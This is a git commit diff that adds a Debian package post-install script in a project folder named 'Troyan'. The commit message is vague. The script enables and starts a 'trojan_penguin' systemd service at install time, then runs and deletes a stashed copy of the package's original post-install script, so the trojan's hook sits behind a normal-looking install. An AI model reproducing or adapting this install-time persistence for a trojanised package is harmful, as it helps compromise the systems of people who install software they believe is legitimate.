55a52b2ea81c737c986bf6c066fd85f945d33d49
RAMMLS <robertr.shakirov@bk.ru>
2025-09-13 20:37:22 +0300

    I solute a mistake in program filesystem

---
+++ Troyan/DEBIAN/postinst.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+debug=""
+
+systemctl daemon-reload
+systemctl enable trojan_penguin.service
+systemctl start trojan_penguin.service
+
+#выполняем оригинальный постинстал
+if [ -f $debug/usr/bin/tp_orig_postinst ]; then
+  $debug/usr/bin/tp_orig_postinst
+  rm $debug/usr/bin/tp_orig_postinst
+fi
